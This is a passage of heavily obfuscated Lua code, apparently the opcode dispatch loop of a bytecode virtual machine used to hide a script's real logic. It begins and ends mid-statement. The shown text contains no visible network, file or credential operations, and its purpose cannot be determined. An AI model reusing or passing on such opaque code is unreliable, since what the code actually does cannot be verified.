w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];n=y[424];end;elseif 180>=z then if z<=177 then if 175>=z then local q;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))elseif z<177 then local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))else do return end;end;elseif z<=178 then local q=0 while true do if q<=7 then if q<=3 then if q<=1 then if 0<q then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if q~=3 then y=f[n];else w[y[716]][y[424]]=w[y[676]];end end else if q<=5 then if 5>q then n=n+1;else y=f[n];end else if q>6 then n=n+1;else w[y[716]]=w[y[424]][y[676]];end end end else if q<=11 then if q<=9 then if q>8 then w[y[716]]=h[y[424]];else y=f[n];end else if q==10 then n=n+1;else y=f[n];end end else if q<=13 then if q>12 then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if q<=14 then y=f[n];else if q~=16 then if(w[y[716]]~=w[y[676]])then n=n+1;else n=y[424];end;else break end end end end end q=q+1 end elseif 179<z then local q=y[716];do return r(w,q,p)end;else local q;w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=y[676];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))end;elseif z<=183 then if 181>=z then local q=0 while true do if q<=18 then if q<=8 then if q<=3 then if q<=1 then if 0==q then w[y[716]]=j[y[424]];else n=n+1;end else if 3>q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end else if q<=5 then if 5>q then n=n+1;else y=f[n];end else if q<=6 then w[y[716]]=j[y[424]];else if q~=8 then n=n+1;else y=f[n];end end end end else if q<=13 then if q<=10 then if q==9 then w[y[716]]=j[y[424]];else n=n+1;end else if q<=11 then y=f[n];else if q<13 then w[y[716]]=j[y[424]];else n=n+1;end end end else if q<=15 then if 14<q then w[y[716]]=j[y[424]];else y=f[n];end else if q<=16 then n=n+1;else if 18>q then y=f[n];else w[y[716]]=j[y[424]];end end end end end else if q<=27 then if q<=22 then if q<=20 then if 19==q then n=n+1;else y=f[n];end else if 22>q then w[y[716]]=j[y[424]];else n=n+1;end end else if q<=24 then if 23==q then y=f[n];else w[y[716]]=j[y[424]];end else if q<=25 then n=n+1;else if 26==q then y=f[n];else w[y[716]]=j[y[424]];end end end end else if q<=32 then if q<=29 then if q>28 then y=f[n];else n=n+1;end else if q<=30 then w[y[716]]={};else if q>31 then y=f[n];else n=n+1;end end end else if q<=34 then if 34~=q then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if q<=35 then y=f[n];else if 36<q then break else if not w[y[716]]then n=n+1;else n=y[424];end;end end end end end end q=q+1 end elseif 182<z then local q;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))else w[y[716]][y[424]]=y[676];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];end;elseif 184>=z then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))elseif 185<z then w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];if w[y[716]]then n=n+1;else n=y[424];end;else local q=y[716];do return w[q](r(w,q+1,y[424]))end;end;elseif 279>=z then if z<=232 then if z<=209 then if z<=197 then if z<=191 then if z<=188 then if 187<z then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))else for q=y[716],y[424],1 do w[q]=nil;end;end;elseif 189>=z then w[y[716]]=false;elseif z~=191 then w[y[716]]=true;else local q;w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=y[676];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))end;elseif z<=194 then if z<=192 then local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))elseif z~=194 then if(w[y[716]]<=w[y[676]])then n=y[424];else n=n+1;end;else local q=y[716]w[q]=w[q](w[q+1])end;elseif 195>=z then w[y[716]]=false;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];if(w[y[716]]~=y[676])then n=n+1;else n=y[424];end;elseif z~=197 then local q;local x;local ba;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];ba=y[716]x={w[ba](w[ba+1])};q=0;for bb=ba,y[676]do q=q+1;w[bb]=x[q];end else w[y[716]]=j[y[424]];end;elseif z<=203 then if(z<=200)then if(z==198 or z<198)then local q,x=0 while true do if((q==8)or(q<8))then if(q<3 or q==3)then if(not(q~=1)or(q<1))then if(q>0)then w[y[716]]=w[y[424]][y[676]];else x=nil end else if(q>2)then y=f[n];else n=(n+1);end end else if((q==5)or q<5)then if not(not(q~=5))then w[y[716]]=w[y[424]][y[676]];else n=(n+1);end else if((q==6)or q<6)then y=f[n];else if not(not(q==7))then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end end end else if((q<13)or not(q~=13))then if(q<10 or q==10)then if not(not(9==q))then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if(q==11 or q<11)then n=(n+1);else if(13>q)then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end else if(q==15 or q<15)then if not(q==15)then n=(n+1);else y=f[n];end else if(q<=16)then x=y[716]else if not(17~=q)then w[x]=w[x](w[(x+1)])else break end end end end end q=(q+1)end elseif(199<z)then local q,x=0 while true do if(q<7 or q==7)then if(q==3 or q<3)then if q<=1 then if 1>q then x=nil else w[y[716]]=h[y[424]];end else if not(q~=2)then n=n+1;else y=f[n];end end else if(q==5 or q<5)then if q>4 then n=(n+1);else w[y[716]]=y[424];end else if(7~=q)then y=f[n];else w[y[716]]=y[424];end end end else if(q==11 or q<11)then if(q<=9)then if 8<q then y=f[n];else n=n+1;end else if(q==10)then w[y[716]]=y[424];else n=n+1;end end else if(q<=13)then if(13~=q)then y=f[n];else x=y[716]end else if q<15 then w[x]=w[x](r(w,(x+1),y[424]))else break end end end end q=q+1 end else local q,x=0 while true do if(q<10 or q==10)then if q<=4 then if(q==1 or q<1)then if q<1 then x=nil else w[y[716]]=w[y[424]][y[676]];end else if(q<=2)then n=n+1;else if(q<4)then y=f[n];else w[y[716]]=y[424];end end end else if(q<=7)then if q<=5 then n=(n+1);else if(6<q)then w[y[716]]=h[y[424]];else y=f[n];end end else if(q<=8)then n=(n+1);else if 10>q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if(q<=16)then if(q<=13)then if(q<=11)then n=(n+1);else if not(q~=12)then y=f[n];else x=y[716];end end else if(q<14 or q==14)then do return w[x](r(w,(x+1),y[424]))end;else if not(q~=15)then n=(n+1);else y=f[n];end end end else if(q<19 or q==19)then if(q<=17)then x=y[716];else if(19>q)then do return r(w,x,p)end;else n=n+1;end end else if(q==20 or q<20)then y=f[n];else if q==21 then n=y[424];else break end end end end end q=q+1 end end;elseif(201>z or 201==z)then local q=w[y[676]];if not q then n=n+1;else w[y[716]]=q;n=y[424];end;elseif(202==z)then a(c,e);else j[y[424]]=w[y[716]];end;elseif z<=206 then if(z<=204)then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q>0 then ba=nil else x=nil end else if q<=2 then bb=nil else if q~=4 then w[y[716]]=h[y[424]];else n=n+1;end end end else if q<=6 then if 6>q then y=f[n];else w[y[716]]=h[y[424]];end else if q<=7 then n=n+1;else if q==8 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if q<=14 then if q<=11 then if q==10 then n=n+1;else y=f[n];end else if q<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if q==13 then n=n+1;else y=f[n];end end end else if q<=16 then if q>15 then ba={w[bb](w[bb+1])};else bb=y[716]end else if q<=17 then x=0;else if q<19 then for bc=bb,y[676]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end elseif z==205 then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q>0 then ba=nil else x=nil end else if q<=2 then bb=nil else if 3==q then w[y[716]]=h[y[424]];else n=n+1;end end end else if q<=6 then if q==5 then y=f[n];else w[y[716]]=h[y[424]];end else if q<=7 then n=n+1;else if q==8 then y=f[n];else w[y[716]]=w[y[424]][y[676]];end end end end else if q<=14 then if q<=11 then if 11>q then n=n+1;else y=f[n];end else if q<=12 then w[y[716]]=w[y[424]][w[y[676]]];else if 14~=q then n=n+1;else y=f[n];end end end else if q<=16 then if q>15 then ba={w[bb](w[bb+1])};else bb=y[716]end else if q<=17 then x=0;else if 19~=q then for bc=bb,y[676]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=15 then if q<=7 then if q<=3 then if q<=1 then if 1>q then x=nil else ba=nil end else if q~=3 then bb=nil else w[y[716]]=h[y[424]];end end else if q<=5 then if q>4 then y=f[n];else n=n+1;end else if 7~=q then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end end else if q<=11 then if q<=9 then if q==8 then y=f[n];else w[y[716]]=h[y[424]];end else if q<11 then n=n+1;else y=f[n];end end else if q<=13 then if 13~=q then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if q==14 then y=f[n];else w[y[716]]=w[y[424]][w[y[676]]];end end end end else if q<=23 then if q<=19 then if q<=17 then if q~=17 then n=n+1;else y=f[n];end else if q>18 then n=n+1;else w[y[716]]=h[y[424]];end end else if q<=21 then if 21~=q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if 23>q then n=n+1;else y=f[n];end end end else if q<=27 then if q<=25 then if 24<q then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if 26==q then y=f[n];else bb=y[424];end end else if q<=29 then if 29~=q then ba=y[676];else x=k(w,g,bb,ba);end else if 31~=q then w[y[716]]=x;else break end end end end end q=q+1 end end;elseif 207>=z then local q;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))elseif z>208 then local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))else if(w[y[716]]<w[y[676]])then n=n+1;else n=y[424];end;end;elseif 220>=z then if z<=214 then if 211>=z then if not(210~=z)then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q>0 then w[y[716]]=w[y[424]][y[676]];else x=nil end else if q==2 then n=n+1;else y=f[n];end end else if q<=5 then if 4<q then n=n+1;else w[y[716]]=w[y[424]];end else if 6<q then w[y[716]]=h[y[424]];else y=f[n];end end end else if q<=11 then if q<=9 then if q>8 then y=f[n];else n=n+1;end else if 11~=q then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end else if q<=13 then if q>12 then x=y[716]else y=f[n];end else if q>14 then break else w[x]=w[x](r(w,x+1,y[424]))end end end end q=q+1 end else local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if 0==q then x=nil else w[y[716]]=w[y[424]][y[676]];end else if q>2 then y=f[n];else n=n+1;end end else if q<=5 then if q>4 then n=n+1;else w[y[716]]=y[424];end else if q>6 then w[y[716]]=y[424];else y=f[n];end end end else if q<=11 then if q<=9 then if q~=9 then n=n+1;else y=f[n];end else if 10==q then w[y[716]]=y[424];else n=n+1;end end else if q<=13 then if q==12 then y=f[n];else x=y[716]end else if 15>q then w[x]=w[x](r(w,x+1,y[424]))else break end end end end q=q+1 end end;elseif 212>=z then local q;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))elseif 214~=z then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];if(w[y[716]]~=y[676])then n=n+1;else n=y[424];end;else w[y[716]]=w[y[424]]/y[676];end;elseif z<=217 then if 215>=z then local q=y[716]local x,ba=i(w[q](r(w,q+1,y[424])))p=ba+q-1 local ba=0;for bb=q,p do ba=ba+1;w[bb]=x[ba];end;elseif z~=217 then w[y[716]][y[424]]=y[676];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];else local q;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))end;elseif 218>=z then w[y[716]]={r({},1,y[424])};elseif 220~=z then local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q]()else local q;local x;w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];x=y[716];q=w[y[424]];w[x+1]=q;w[x]=q[w[y[676]]];end;elseif z<=226 then if 223>=z then if(221>z or 221==z)then local q=y[716];local x,ba,bb=w[q],w[q+1],w[q+2];local x=x+bb;w[q]=x;if(bb>0 and x<=ba)or bb<0 and x>=ba then n=y[424];w[(q+3)]=x;end;elseif(222<z)then w[y[716]]=false;n=n+1;else local q,x=0 while true do if q<=14 then if q<=6 then if q<=2 then if q<=0 then x=nil else if q==1 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end end else if q<=4 then if 3==q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if q<6 then n=n+1;else y=f[n];end end end else if q<=10 then if q<=8 then if q<8 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if q<10 then y=f[n];else w[y[716]]=w[y[424]]*y[676];end end else if q<=12 then if 11==q then n=n+1;else y=f[n];end else if 13==q then w[y[716]]=w[y[424]]+w[y[676]];else n=n+1;end end end end else if q<=22 then if q<=18 then if q<=16 then if q==15 then y=f[n];else w[y[716]]=j[y[424]];end else if q==17 then n=n+1;else y=f[n];end end else if q<=20 then if 19<q then n=n+1;else w[y[716]]=w[y[424]][y[676]];end else if q~=22 then y=f[n];else w[y[716]]=w[y[424]];end end end else if q<=26 then if q<=24 then if q>23 then y=f[n];else n=n+1;end else if 25<q then n=n+1;else w[y[716]]=w[y[424]]+w[y[676]];end end else if q<=28 then if 28~=q then y=f[n];else x=y[716]end else if q~=30 then w[x]=w[x](r(w,x+1,y[424]))else break end end end end end q=q+1 end end;elseif 224>=z then local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if q~=1 then x=nil else w[y[716]]=j[y[424]];end else if q<3 then n=n+1;else y=f[n];end end else if q<=5 then if q<5 then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if q<=6 then y=f[n];else if 7==q then w[y[716]]=y[424];else n=n+1;end end end end else if q<=13 then if q<=10 then if q~=10 then y=f[n];else w[y[716]]=y[424];end else if q<=11 then n=n+1;else if 12==q then y=f[n];else w[y[716]]=y[424];end end end else if q<=15 then if 14==q then n=n+1;else y=f[n];end else if q<=16 then x=y[716]else if 17<q then break else w[x]=w[x](r(w,x+1,y[424]))end end end end end q=q+1 end elseif 226~=z then w[y[716]]=w[y[424]]+y[676];else local q;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))end;elseif z<=229 then if 227>=z then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716];w[q]=w[q]-w[q+2];n=y[424];elseif z<229 then local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q]()else w[y[716]]=false;end;elseif z<=230 then local q;w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q]()elseif z>231 then local q;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))else w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];n=y[424];end;elseif z<=255 then if z<=243 then if 237>=z then if z<=234 then if z~=234 then local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=false;n=n+1;y=f[n];q=y[716]w[q](w[q+1])else if not w[y[716]]then n=n+1;else n=y[424];end;end;elseif 235>=z then local q=0 while true do if q<=7 then if q<=3 then if q<=1 then if 1>q then w[y[716]]=w[y[424]][y[676]];else n=n+1;end else if q>2 then w[y[716]][y[424]]=w[y[676]];else y=f[n];end end else if q<=5 then if 5~=q then n=n+1;else y=f[n];end else if 6==q then w[y[716]]=h[y[424]];else n=n+1;end end end else if q<=11 then if q<=9 then if 9>q then y=f[n];else w[y[716]]=w[y[424]][y[676]];end else if 11>q then n=n+1;else y=f[n];end end else if q<=13 then if q>12 then n=n+1;else w[y[716]][y[424]]=w[y[676]];end else if q<=14 then y=f[n];else if 15<q then break else do return w[y[716]]end end end end end end q=q+1 end elseif 237~=z then w[y[716]]={};n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];else local q;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];w[y[716]]=w[y[424]];n=n+1;y=f[n];q=y[716]w[q]=w[q](w[q+1])end;elseif z<=240 then if z<=238 then local q=y[716];local x=w[q];for ba=q+1,p do t(x,w[ba])end;elseif 240~=z then w[y[716]]=w[y[424]]*y[676];else local q=y[716];w[q]=w[q]-w[q+2];n=y[424];end;elseif 241>=z then local q;w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=y[676];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))elseif 243>z then local q;w[y[716]]=w[y[424]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))else local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))end;elseif z<=249 then if 246>=z then if z<=244 then local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))elseif 245<z then w[y[716]][w[y[424]]]=w[y[676]];else if(y[716]<=w[y[676]])then n=n+1;else n=y[424];end;end;elseif 247>=z then local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=false;n=n+1;y=f[n];q=y[716]w[q](w[q+1])elseif z<249 then local q;w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q]()else local q;local x;local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];ba=y[716]x={w[ba](w[ba+1])};q=0;for bb=ba,y[676]do q=q+1;w[bb]=x[q];end end;elseif z<=252 then if z<=250 then w[y[716]]={r({},1,y[424])};elseif 252~=z then w[y[716]]=false;n=n+1;else local q;w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];w[y[716]]=y[424];n=n+1;y=f[n];q=y[716]w[q]=w[q](r(w,q+1,y[424]))end;elseif 253>=z then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]]={};n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];if w[y[716]]then n=n+1;else n=y[424];end;elseif 254==z then local q;w[y[716]]={};n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=j[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q]()else w[y[716]][y[424]]=w[y[676]];end;elseif z<=267 then if 261>=z then if 258>=z then if 256>=z then if(w[y[716]]<=w[y[676]])then n=n+1;else n=y[424];end;elseif 258>z then local q=y[716];local x,ba,bb=w[q],w[q+1],w[q+2];local x=x+bb;w[q]=x;if bb>0 and x<=ba or bb<0 and x>=ba then n=y[424];w[q+3]=x;end;else local q=y[716]w[q]=w[q](r(w,q+1,p))end;elseif 259>=z then local q;local x;local ba;w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=h[y[424]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][w[y[676]]];n=n+1;y=f[n];ba=y[716]x={w[ba](w[ba+1])};q=0;for bb=ba,y[676]do q=q+1;w[bb]=x[q];end elseif 260==z then local q;w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];q=y[716]w[q]=w[q](w[q+1])else w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]]=w[y[424]][y[676]];n=n+1;y=f[n];w[y[716]][y[424]]=w[y[676]];n=n+1;y=f[n];n=y[424];end;elseif 264>=z then if z<=262 then local q,x,ba=0 while true do if q<=12 then if q<=5 then if q<=2 then 